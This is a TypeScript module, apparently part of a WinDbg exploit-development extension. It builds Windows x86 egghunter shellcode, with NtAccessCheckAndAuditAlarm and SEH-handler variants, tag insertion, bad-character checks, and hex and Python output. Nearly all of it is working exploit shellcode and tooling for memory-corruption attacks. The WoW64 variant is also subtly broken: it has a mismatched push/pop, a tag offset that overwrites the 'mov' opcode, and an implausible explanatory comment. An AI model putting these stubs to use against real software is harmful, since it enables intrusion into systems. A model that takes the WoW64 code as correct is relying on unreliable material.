import { Command, CommandResult } from "../core/registry";
import * as out from "../core/output";

type EggMode = "ntaccess" | "seh";

type EggOptions = {
  tag: string;
  mode: EggMode;
  wow64: boolean;
  badchars: number[];
};

// NtAccessCheckAndAuditAlarm egghunter (syscall 0x02, INT 0x2E). 32 bytes.
// Scans page-by-page using the syscall for access checks, then dword-by-dword
// with scasd for double-tag matching. Tag placeholder at offset 18.
const NTACCESS_X86: number[] = [
  0x66, 0x81, 0xca, 0xff, 0x0f, // or dx, 0x0fff
  0x42,                         // inc edx
  0x52,                         // push edx
  0x6a, 0x02,                   // push 0x2
  0x58,                         // pop eax
  0xcd, 0x2e,                   // int 0x2e
  0x3c, 0x05,                   // cmp al, 0x5
  0x5a,                         // pop edx
  0x74, 0xef,                   // je short (back to or dx)
  0xb8, 0x54, 0x30, 0x30, 0x57, // mov eax, <TAG>
  0x8b, 0xfa,                   // mov edi, edx
  0xaf,                         // scasd
  0x75, 0xea,                   // jne short (back to inc edx)
  0xaf,                         // scasd
  0x75, 0xe7,                   // jne short (back to inc edx)
  0xff, 0xe7,                   // jmp edi
];

// WoW64 variant: uses inc ecx (0x41) instead of inc edx (0x42) to avoid REX
// prefix collision in the WoW64 thunk layer.
const NTACCESS_WOW64: number[] = [
  0x66, 0x81, 0xca, 0xff, 0x0f,
  0x41,
  0x6a, 0x02,
  0x58,
  0xcd, 0x2e,
  0x3c, 0x05,
  0x5a,
  0x74, 0xef,
  0xb8, 0x54, 0x30, 0x30, 0x57,
  0x8b, 0xfa,
  0xaf,
  0x75, 0xea,
  0xaf,
  0x75, 0xe7,
  0xff, 0xe7,
];

// SEH-based egghunter. 70 bytes. Position-independent via call $+5/pop.
// Installs a custom exception handler that catches ACCESS_VIOLATION from scasd
// and resumes at the next page. No syscall-number dependency, so it's portable
// across Windows versions.
//
// Layout:
//   [0x00] jmp short install_seh (skip handler)
//   [0x02] handler: reads ContextRecord from stdcall args, computes scan_loop
//          address from EstablisherFrame→Handler, sets Eip, returns
//          EXCEPTION_CONTINUE_EXECUTION.
//   [0x19] install_seh: gets handler address via call/pop, installs SEH frame.
//   [0x2D] scan_loop: or di,0xfff (handler resumes here → next page)
//   [0x32] next_addr: inc edi (jnz resumes here → next dword)
//          mov eax, TAG; scasd; jnz next_addr; scasd; jnz next_addr;
//          restore old SEH; jmp edi.
//
// Tag at offset 0x34. Contains null bytes (offsets 0x13-0x15, 0x1C-0x1F).
const SEH_EGGHUNTER: number[] = [
  // jmp short install_seh
  0xeb, 0x17,
  // handler (offset 0x02, 23 bytes)
  0x8b, 0x4c, 0x24, 0x0c,             // mov ecx, [esp+0x0C]      (ContextRecord)
  0x8b, 0x44, 0x24, 0x08,             // mov eax, [esp+0x08]      (EstablisherFrame)
  0x8b, 0x40, 0x04,                   // mov eax, [eax+0x04]      (handler address)
  0x83, 0xc0, 0x2b,                   // add eax, 0x2B            (scan_loop = handler+43)
  0x89, 0x81, 0xb8, 0x00, 0x00, 0x00, // mov [ecx+0xB8], eax     (set Eip = scan_loop)
  0x31, 0xc0,                         // xor eax, eax             (EXCEPTION_CONTINUE_EXECUTION)
  0xc3,                               // ret
  // install_seh (offset 0x19)
  0x31, 0xd2,                         // xor edx, edx
  0xe8, 0x00, 0x00, 0x00, 0x00,       // call $+5
  0x5e,                               // pop esi                  (esi = addr of this pop)
  0x83, 0xee, 0x1e,                   // sub esi, 0x1E            (esi = handler addr)
  0x56,                               // push esi                 (handler)
  0x64, 0xff, 0x32,                   // push dword ptr fs:[edx]  (old SEH)
  0x64, 0x89, 0x22,                   // mov dword ptr fs:[edx], esp
  0x31, 0xff,                         // xor edi, edi             (scan from 0)
  // scan_loop (offset 0x2D) — handler resumes here (next page)
  0x66, 0x81, 0xcf, 0xff, 0x0f,       // or di, 0x0FFF
  // next_addr (offset 0x32) — jnz resumes here (next dword)
  0x47,                               // inc edi
  0xb8, 0x54, 0x30, 0x30, 0x57,       // mov eax, <TAG>           (tag at offset 0x34)
  0xaf,                               // scasd
  0x75, 0xf7,                         // jnz next_addr            (0x32)
  0xaf,                               // scasd
  0x75, 0xf4,                         // jnz next_addr            (0x32)
  // found — restore old SEH and jump
  0x64, 0x8f, 0x02,                   // pop dword ptr fs:[edx]
  0x83, 0xc4, 0x04,                   // add esp, 0x04
  0xff, 0xe7,                         // jmp edi
];

const TAG_OFFSET_NTACCESS = 18;
const TAG_OFFSET_NTACCESS_WOW64 = 16;
const TAG_OFFSET_SEH = 0x34;

function uniqueBytes(values: number[] | undefined): number[] {
  const seen = new Set<number>();
  for (const v of values ?? []) {
    if (Number.isInteger(v) && v >= 0 && v <= 0xff) seen.add(v & 0xff);
  }
  return [...seen].sort((a, b) => a - b);
}

function checkBadchars(bytes: number[], label: string, badSet: Set<number>): string[] {
  const hits: string[] = [];
  for (let i = 0; i < bytes.length; i++) {
    if (badSet.has(bytes[i])) {
      hits.push(`byte 0x${bytes[i].toString(16).toUpperCase().padStart(2, "0")} at offset ${i} in ${label}`);
    }
  }
  return hits;
}

function tagBytes(tag: string): number[] {
  return tag.padEnd(4, "X").slice(0, 4).split("").map((c) => c.charCodeAt(0));
}

export function buildEgghunter(options: EggOptions): { bytes: number[]; size: number; badcharHits: string[] } {
  const tag = tagBytes(options.tag);
  const badSet = new Set(uniqueBytes(options.badchars));

  let template: number[];
  let tagOffset: number;
  let label: string;

  if (options.mode === "seh") {
    template = [...SEH_EGGHUNTER];
    tagOffset = TAG_OFFSET_SEH;
    label = "seh egghunter";
  } else if (options.wow64) {
    template = [...NTACCESS_WOW64];
    tagOffset = TAG_OFFSET_NTACCESS_WOW64;
    label = "ntaccess wow64 egghunter";
  } else {
    template = [...NTACCESS_X86];
    tagOffset = TAG_OFFSET_NTACCESS;
    label = "ntaccess egghunter";
  }

  template.splice(tagOffset, 4, ...tag);
  const badcharHits = checkBadchars(template, label, badSet);
  return { bytes: template, size: template.length, badcharHits };
}

function bytesToHex(bytes: number[]): string {
  return bytes.map((v) => v.toString(16).toUpperCase().padStart(2, "0")).join("");
}

function bytesToPython(bytes: number[]): string {
  return `b"${bytes.map((v) => `\\x${v.toString(16).padStart(2, "0")}`).join("")}"`;
}

export function createEgghunterCommand(): Command {
  return {
    name: "egghunter",
    description: "Generate NtAccess/SEH egghunter stubs with badchar checking.",
    usage: "dx @$osed().egghunter({ tag: 'W00T', mode: 'ntaccess', wow64: false, badchars: [0, 0x0a] })",
    examples: [
      "dx @$osed().egghunter({ tag: 'W00T' })",
      "dx @$osed().egghunter({ tag: 'B33F', mode: 'seh' })",
      "dx @$osed().egghunter({ tag: 'W00T', mode: 'ntaccess', wow64: true })",
      "dx @$osed().egghunter({ tag: 'W00T', badchars: [0, 0x0a, 0x0d] })",
    ],
    schema: {
      tag: { type: "string", default: "W00T" },
      mode: { type: "string", enum: ["ntaccess", "seh"], default: "ntaccess" },
      wow64: { type: "boolean", default: false },
      badchars: { type: "array", default: [] },
    },
    execute(options: Record<string, unknown>): CommandResult {
      const opts: EggOptions = {
        tag: (options.tag as string) ?? "W00T",
        mode: (options.mode as EggMode) ?? "ntaccess",
        wow64: (options.wow64 as boolean) ?? false,
        badchars: (options.badchars as number[]) ?? [],
      };

      const result = buildEgghunter(opts);

      out.section("Egghunter");
      out.info(`Tag: ${opts.tag} | Mode: ${opts.mode}${opts.wow64 ? " (WoW64)" : ""} | Size: ${result.size} bytes`);
      out.print(bytesToHex(result.bytes));
      out.print(bytesToPython(result.bytes));
      if (result.badcharHits.length > 0) {
        for (const hit of result.badcharHits) {
          out.warn(`Badchar: ${hit}`);
        }
      }

      return {
        command: "egghunter",
        args: options,
        success: result.badcharHits.length === 0,
        findings: [result],
        warnings: result.badcharHits,
        errors: [],
      };
    },
  };
}
